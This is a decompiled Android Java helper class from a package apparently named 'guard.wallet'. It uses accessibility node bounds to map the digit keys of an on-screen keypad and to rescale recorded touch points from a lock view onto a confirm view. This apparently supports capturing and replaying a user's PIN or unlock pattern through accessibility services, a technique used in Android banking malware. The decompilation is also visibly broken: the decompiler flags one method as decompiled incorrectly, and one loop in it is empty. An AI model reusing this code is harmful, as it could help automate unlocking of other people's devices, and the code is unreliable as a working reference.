package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.graphics.Rect;
import android.os.Build;
import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.entity.Point;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.AbstractC0249e;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;

/* renamed from: com.guard.wallet.helper.a */
/* loaded from: classes.dex */
public abstract class AbstractC0178a {
    /* renamed from: a */
    public static Rect m339a(AccessibilityNodeInfoCompat accessibilityNodeInfoCompat) {
        AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) accessibilityNodeInfoCompat.getInfo();
        Rect rect = new Rect();
        if (Build.VERSION.SDK_INT >= 34) {
            accessibilityNodeInfo.getBoundsInWindow(rect);
        } else {
            accessibilityNodeInfo.getBoundsInScreen(rect);
        }
        m341c(rect);
        return rect;
    }

    /* renamed from: b */
    public static HashMap m340b(Rect rect) {
        Rect rect2;
        HashMap hashMap = new HashMap();
        float width = rect.width() / 3.0f;
        float height = rect.height() / 4.0f;
        for (int i2 = 0; i2 <= 9; i2++) {
            if (i2 == 0) {
                float f2 = rect.left + width;
                float f3 = (height * 3.0f) + rect.top;
                rect2 = new Rect((int) f2, (int) f3, (int) (f2 + width), (int) (f3 + height));
            } else {
                int i3 = i2 - 1;
                float f4 = ((i3 / 3) * height) + rect.top;
                float f5 = ((i3 % 3) * width) + rect.left;
                rect2 = new Rect((int) f5, (int) f4, (int) (f5 + width), (int) (f4 + height));
            }
            hashMap.put(Integer.valueOf(i2), rect2);
        }
        return hashMap;
    }

    /* renamed from: c */
    public static void m341c(Rect rect) {
        int i2;
        ScreenMetricsVO m616e = AbstractC0249e.m616e();
        if (m616e.getWidth().intValue() <= 0 || (i2 = rect.left) <= 0 || i2 < m616e.getWidth().intValue()) {
            return;
        }
        rect.left -= m616e.getWidth().intValue();
        rect.right -= m616e.getWidth().intValue();
    }

    /* renamed from: d */
    public static void m342d(LinkedList linkedList) {
        if (linkedList.isEmpty()) {
            return;
        }
        ListIterator listIterator = linkedList.listIterator();
        Point point = null;
        while (listIterator.hasNext()) {
            Point point2 = (Point) listIterator.next();
            if (point2 == null || point2.getX() < 0.0f || point2.getY() < 0.0f) {
                listIterator.remove();
            } else {
                if (point2.equals(point)) {
                    listIterator.remove();
                }
                point = point2;
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:29:0x00e7 A[LOOP:0: B:27:0x00e1->B:29:0x00e7, LOOP_END] */
    /* renamed from: e */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static List m343e(LinkedList linkedList, Rect rect, Rect rect2, Rect rect3, Rect rect4) {
        int i2;
        ListIterator listIterator;
        if (rect2 != null && rect != null && rect4 != null && rect3 != null) {
            AbstractC0026q.m151B("center");
            AbstractC0026q.m151B("center");
            if (!linkedList.isEmpty()) {
                LinkedList linkedList2 = new LinkedList();
                ScreenMetricsVO m616e = AbstractC0249e.m616e();
                int i3 = rect2.bottom - rect2.top;
                int i4 = rect.right - rect.left;
                int i5 = rect.bottom - rect.top;
                int min = Math.min(i5, i4);
                int i6 = i5 < i3 ? i3 - i5 : 0;
                int intValue = m616e.getWidth().intValue() > 0 ? m616e.getWidth().intValue() / 2 : (i4 / 2) + rect.left;
                int i7 = (i5 / 2) + rect.top;
                if ("center".equals("center")) {
                    i7 += i6 / 2;
                } else if ("center".equals("bottom")) {
                    i7 += i6;
                } else {
                    Log.d("AccessibilityNodeInfoHelper", "lockCenterY：" + i7);
                }
                int i8 = rect4.bottom - rect4.top;
                int i9 = rect3.right - rect3.left;
                int i10 = rect3.bottom - rect3.top;
                int min2 = Math.min(i10, i9);
                int i11 = i10 < i8 ? i8 - i10 : 0;
                int intValue2 = m616e.getWidth().intValue() > 0 ? m616e.getWidth().intValue() / 2 : rect3.left + (i9 / 2);
                int i12 = (i10 / 2) + rect3.top;
                if ("center".equals("center")) {
                    i11 /= 2;
                } else if (!"center".equals("bottom")) {
                    Log.d("AccessibilityNodeInfoHelper", "confirmCenterY：" + i12);
                    i2 = i12 - i11;
                    float f2 = min2 / min;
                    listIterator = linkedList.listIterator();
                    while (listIterator.hasNext()) {
                        Point point = (Point) listIterator.next();
                        Point point2 = new Point();
                        point2.setX(((point.getX() - intValue) * f2) + intValue2);
                        point2.setY(((point.getY() - i7) * f2) + i2);
                        linkedList2.add(point2);
                    }
                    return linkedList2;
                }
                i2 = i11 + i12;
                float f22 = min2 / min;
                listIterator = linkedList.listIterator();
                while (listIterator.hasNext()) {
                }
                return linkedList2;
            }
        }
        return linkedList;
    }
}
